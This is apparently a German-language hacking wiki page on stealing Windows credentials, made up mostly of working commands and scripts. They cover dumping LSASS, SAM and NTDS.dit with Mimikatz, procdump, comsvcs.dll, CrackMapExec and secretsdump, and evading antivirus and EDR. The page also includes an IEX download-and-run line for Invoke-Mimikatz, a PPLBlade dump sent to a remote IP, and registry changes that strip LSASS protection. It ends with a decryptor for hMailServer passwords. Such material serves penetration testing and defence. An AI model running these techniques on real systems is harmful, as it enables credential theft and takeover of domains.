# Stehlen von Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Weitere Dinge, die Mimikatz tun kann, findest du in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Erfahre hier mehr über mögliche credentials-Schutzmaßnahmen.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige credentials extrahiert.**

## Credentials mit Meterpreter

Verwende das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um im Opfer **nach passwords und hashes zu suchen**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ist ein legitimes Microsoft-Tool**, wird es nicht von Defender erkannt.\
Du kannst dieses Tool verwenden, um **den lsass process zu dumpen**, **den dump herunterzuladen** und **zu extrahieren** **die credentials lokal** aus dem dump.

Du könntest auch [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe to dump lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolge **"procdump.exe" and "lsass.exe"** detektieren. Deshalb ist es **unauffälliger**, als **Argument** die **PID** von lsass.exe an procdump **statt** den **Namen lsass.exe** zu übergeben.

### Dumping lsass with **comsvcs.dll**

Eine DLL namens **comsvcs.dll**, gefunden in `C:\Windows\System32`, ist dafür verantwortlich, bei einem Absturz den Prozessspeicher zu dumpen. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die dafür gedacht ist, mittels `rundll32.exe` aufgerufen zu werden.\
Die ersten beiden Argumente sind irrelevant, das dritte dagegen ist in drei Komponenten unterteilt. Die zu dumpende Prozess-ID bildet die erste Komponente, der Speicherort der Dump-Datei stellt die zweite dar, und die dritte Komponente ist strikt das Wort **full**. Es gibt keine Alternativen.\
Nachdem diese drei Komponenten geparst wurden, erzeugt die DLL die Dump-Datei und schreibt den Speicher des spezifizierten Prozesses in diese Datei.\
Die Verwendung der **comsvcs.dll** ist geeignet, um den lsass-Prozess zu dumpen, wodurch es nicht nötig ist, procdump hochzuladen und auszuführen. Diese Methode wird detailliert unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) beschrieben.

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass mit Task Manager dumpen**

1. Klicken Sie mit der rechten Maustaste auf die Task Bar und klicken Sie auf Task Manager
2. Klicken Sie auf More details
3. Suchen Sie im Processes tab nach dem Prozess "Local Security Authority Process"
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und klicken Sie auf "Create dump file".

### lsass mit procdump dumpen

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Protected Process Dumper Tool, das obfuscating memory dump unterstützt und diese auf Remote-Workstations überträgt, ohne sie auf die Festplatte abzulegen.

**Hauptfunktionen**:

1. Bypassing PPL protection
2. Obfuscating memory dump files, um Defender signaturbasierte Erkennungsmechanismen zu umgehen
3. Uploading memory dump mit RAW- und SMB-Upload-Methoden, ohne sie auf die Festplatte abzulegen (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-basierter LSASS-Dump ohne MiniDumpWriteDump

Ink Dragon liefert einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft, sodass EDR-Hooks auf diese API nie ausgelöst werden:

1. **Stage 1 loader (`lals.exe`)** – sucht in `fdp.dll` nach einem Platzhalter, der aus 32 kleingeschriebenen `d`-Zeichen besteht, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die bösartige DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 inside LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, xoriert jedes Byte mit `0x20` und mapped das decodierte Blob in den Speicher, bevor die Ausführung übergeben wird.
3. **Stage 3 dumper** – die gemappte Payload implementiert die MiniDump-Logik neu, indem sie direkte syscalls verwendet, die aus gehashten API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, streamt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, sodass die Exfiltration später erfolgen kann.

Operatorhinweise:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 überschreibt den hardkodierten Platzhalter mit dem absoluten Pfad zu `rtu.txt`, daher unterbricht eine Aufteilung die Kette.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst setzen, damit LSASS den SSP bei jedem Boot neu lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Lokal dekomprimieren und anschließend an Mimikatz/Volatility zur Credential-Extraktion weitergeben.
* Das Ausführen von `lals.exe` erfordert Admin-/SeTcb-Rechte, damit `AddSecurityPackageA` erfolgreich ist; sobald der Aufruf zurückkehrt, lädt LSASS transparent den Rogue-SSP und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte entfernt sie nicht aus LSASS. Entweder den Registry-Eintrag löschen und LSASS neu starten (Reboot) oder die DLL für langfristige Persistenz belassen.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Secrets auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit vom Ziel-DC auslesen
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump der NTDS.dit Passwort-Historie vom Ziel-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeige das pwdLastSet-Attribut für jedes Konto in NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Aber man kann sie nicht einfach auf normale Weise kopieren, da sie geschützt sind.

### From Registry

Der einfachste Weg, diese Dateien zu stehlen, ist, eine Kopie aus der Registry zu bekommen:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die hashes** mit:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können geschützte Dateien mit diesem Dienst kopieren. Sie müssen Administrator sein.

#### Verwendung von vssadmin

Die vssadmin-Binärdatei ist nur in Windows Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber das gleiche kannst du auch mit **Powershell** durchführen. Das ist ein Beispiel dafür, **wie man die SAM file kopiert** (das verwendete Laufwerk ist "C:" und sie wird nach C:\users\Public gespeichert), aber du kannst das für das Kopieren jeder geschützten Datei verwenden:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich können Sie auch das [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-Datei gilt als das Herz von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. Hier werden die **password hashes** für Domain-Benutzer gespeichert. Diese Datei ist eine Extensible Storage Engine (ESE) Datenbank und befindet sich unter _%SystemRoom%/NTDS/ntds.dit_.

Innerhalb dieser Datenbank werden drei primäre Tabellen geführt:

- **Data Table**: Diese Tabelle speichert Details zu Objekten wie Benutzer und Gruppen.
- **Link Table**: Sie verfolgt Beziehungen, z. B. Gruppenmitgliedschaften.
- **SD Table**: Hier werden die **Security descriptors** für jedes Objekt gehalten und sorgen für die Sicherheit und Zugriffskontrolle der gespeicherten Objekte.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ genutzt. Ein Teil der **NTDS.dit**-Datei kann sich dann im `lsass`-Speicher befinden (man findet wahrscheinlich zuletzt verwendete Daten, da zur Performance-Verbesserung ein **cache** verwendet wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash ist dreifach verschlüsselt:

1. Den Password Encryption Key (**PEK**) mit dem **BOOTKEY** und **RC4** entschlüsseln.
2. Den **hash** mit **PEK** und **RC4** entschlüsseln.
3. Den **hash** mit **DES** entschlüsseln.

**PEK** haben den **denselben Wert** in **jedem Domain Controller**, sind jedoch **verschlüsselt** innerhalb der **NTDS.dit**-Datei mit dem **BOOTKEY** der **SYSTEM-Datei des Domain Controllers (ist zwischen Domain Controllern unterschiedlich)**. Deshalb benötigt man, um die Anmeldeinformationen aus der NTDS.dit zu erhalten, die Dateien **NTDS.dit** und **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Sie können auch den [**volume shadow copy**](#stealing-sam-and-system)-Trick verwenden, um die **ntds.dit**-Datei zu kopieren. Denken Sie daran, dass Sie außerdem eine Kopie der **SYSTEM-Datei** benötigen (ebenfalls [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)-Trick).

### **Hashes aus NTDS.dit extrahieren**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** **erhalten** haben, können Sie Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können **sie automatisch extrahieren** mit einem gültigen domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, diese mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden

### **Extrahieren von Domain-Objekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Es werden nicht nur secrets extrahiert, sondern auch die gesamten Objekte und ihre Attribute zur weiteren Informationsgewinnung, sofern die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive ist optional, ermöglicht jedoch die Entschlüsselung von Secrets (NT & LM hashes, supplemental credentials wie cleartext passwords, kerberos- oder trust keys, NT & LM password histories). Zusammen mit weiteren Informationen werden folgende Daten extrahiert: user- und machine-accounts mit ihren hashes, UAC flags, Zeitstempel für last logon und password change, Account-Beschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organizational units tree und Mitgliedschaften, trusted domains mit trusts type, direction und attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Du kannst dieses Binary verwenden, um credentials aus verschiedener Software zu extrahieren.
```
lazagne.exe all
```
## Weitere Tools zum Extrahieren von credentials aus SAM und LSASS

### Windows credentials Editor (WCE)

Dieses Tool kann verwendet werden, um credentials aus dem memory zu extrahieren. Herunterladen von: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahiert credentials aus der SAM-Datei
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Credentials aus der SAM-Datei extrahieren
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Lade es herunter von:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und führe es einfach **aus**, dann werden die Passwörter extrahiert.

## Ausspähen inaktiver RDP-Sitzungen und Abschwächung von Sicherheitskontrollen

Ink Dragon’s FinalDraft RAT enthält einen `DumpRDPHistory` Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:

### DumpRDPHistory-artige Telemetrieerfassung

* **Outbound RDP targets** – durchsuche jede Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den LastWrite-Zeitstempel. Du kannst FinalDraft’s Logik mit PowerShell nachbilden:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – frage das `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` Log nach Event-IDs **21** (erfolgreiche Anmeldung) und **25** (Trennung) ab, um zu ermitteln, wer die Box administriert hat:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange seine **getrennte** Sitzung noch existiert. CredSSP + NTLM fallback hinterlässt deren Verifier und Tokens in LSASS, die dann über SMB/WinRM wieder abgespielt werden können, um `NTDS.dit` zu erbeuten oder Persistenz auf Domänencontrollern zu etablieren.

### Von FinalDraft gezielte Registry-Downgrades

Das gleiche Implantat manipuliert außerdem mehrere Registry-Schlüssel, um das Stehlen von Anmeldedaten zu erleichtern:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Das Setzen von `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von credential/ticket während RDP und ermöglicht pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` deaktiviert UAC token filtering, sodass lokale admins über das Netzwerk uneingeschränkte tokens erhalten.
* `DSRMAdminLogonBehavior=2` erlaubt dem DSRM administrator die Anmeldung, während der DC online ist, und verschafft Angreifern ein weiteres built-in high-privilege account.
* `RunAsPPL=0` entfernt LSASS PPL protections, wodurch memory access für dumpers wie LalsDumper trivial wird.

## hMailServer database credentials (post-compromise)

hMailServer speichert sein DB password in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` unter `[Database] Password=`. Der Wert ist mit Blowfish verschlüsselt, verwendet den statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und 4-Byte-Word-Endianness-Swaps. Verwende den Hex-String aus der INI mit diesem Python-Snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Mit dem Klartextpasswort die SQL CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und gegebenenfalls ein Upgrade durchführen, bevor Hashes abgefragt werden:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword`-Spalte verwendet das hMailServer hash format (hashcat mode `1421`). Das Cracking dieser Werte kann wiederverwendbare credentials für WinRM/SSH pivots liefern.
## Referenzen

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
